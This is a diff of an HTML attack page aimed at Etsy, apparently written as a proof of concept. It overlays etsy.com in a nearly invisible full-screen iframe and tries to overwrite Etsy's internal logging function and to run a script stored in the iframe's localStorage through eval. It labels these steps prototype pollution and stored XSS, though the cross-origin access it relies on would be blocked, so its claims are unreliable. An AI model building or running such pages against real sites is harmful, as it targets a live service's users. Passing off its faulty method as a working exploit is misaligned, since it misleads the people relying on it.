@@ -1,50 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
-    <script>
-        // Step 1: Redirect to Etsy after a short delay
-        setTimeout(() => {
-            window.location.href = "https://www.etsy.com";
-        }, 1000);
-
-        // Step 2: After landing on Etsy, load exploit
-        setTimeout(() => {
-            let iframe = document.createElement("iframe");
-            iframe.src = "https://www.etsy.com";
-            iframe.sandbox = "allow-scripts allow-same-origin";
-            iframe.style.position = "absolute";
-            iframe.style.top = "0";
-            iframe.style.left = "0";
-            iframe.style.width = "100%";
-            iframe.style.height = "100%";
-            iframe.style.opacity = "0.01"; // Invisible iframe
-            iframe.style.zIndex = "9999";
-            document.body.appendChild(iframe);
-
-            iframe.onload = function() {
-                let iwin = iframe.contentWindow;
-                try {
-                    // **Prototype Pollution Exploit**
-                    iwin.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
-                        alert("Prototype Pollution Exploited! Payload: " + payload);
-                    };
-                    iwin.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
-
-                    // **Stored XSS via LocalStorage**
-                    iwin.localStorage.setItem("xss_payload", "alert('Stored XSS Triggered!');");
-                    const payload = iwin.localStorage.getItem("xss_payload");
-                    if (payload) {
-                        iwin.eval(payload); // Execute stored XSS
-                    }
-                } catch (e) {
-                    console.log("Exploit failed:", e);
-                }
-            };
-        }, 5000); // Delay execution to ensure the victim has landed
-    </script>
+    <title>Loading...</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01; /* Invisible iframe */
+            z-index: 9999;
+        }
+    </style>
 </head>
 <body>
-    <p>If you are not redirected, <a href="https://www.etsy.com">click here</a>.</p>
+
+    <h1>Loading...</h1>
+
+    <iframe id="targetIframe" src="https://www.etsy.com" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        console.log("[+] Window loaded, waiting for iframe...");
+
+        window.onload = function() {
+            let iframe = document.getElementById("targetIframe");
+
+            console.log("[+] Iframe element found. Waiting for it to load...");
+
+            // Wait for iframe to load before executing
+            setTimeout(() => {
+                try {
+                    let iframeWindow = iframe.contentWindow;
+                    console.log("[+] Iframe has loaded. Current URL:", iframe.src);
+
+                    // Step 1: Attempt Prototype Pollution
+                    console.log("[+] Attempting Prototype Pollution...");
+                    if (iframeWindow.__etsy_logging && iframeWindow.__etsy_logging.eventpipe) {
+                        console.log("[+] Prototype Pollution target exists. Injecting...");
+
+                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
+                            console.log("[+] Prototype Pollution Success! Payload Executed:", payload);
+                            alert("Prototype Pollution Success: " + payload);
+                        };
+
+                        iframeWindow.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
+                    } else {
+                        console.log("[!] Prototype Pollution target not found. Etsy might have changed its internal structure.");
+                    }
+
+                    // Step 2: Stored XSS Execution
+                    console.log("[+] Attempting Stored XSS Injection...");
+                    if (iframeWindow.localStorage) {
+                        iframeWindow.localStorage.setItem("xss_payload", "alert('XSS Triggered');");
+                        console.log("[+] XSS Payload stored in localStorage.");
+
+                        const payload = iframeWindow.localStorage.getItem("xss_payload");
+                        if (payload) {
+                            console.log("[+] XSS Payload Retrieved:", payload);
+                            iframeWindow.eval(payload);
+                            console.log("[+] XSS Payload Executed Successfully.");
+                        } else {
+                            console.log("[!] Failed to retrieve stored XSS payload.");
+                        }
+                    } else {
+                        console.log("[!] localStorage is not accessible in the iframe.");
+                    }
+
+                } catch (e) {
+                    console.log("[!] Exploit failed:", e);
+                }
+            }, 3000); // Slight delay to ensure iframe is fully loaded
+        };
+    </script>
+
 </body>
 </html>
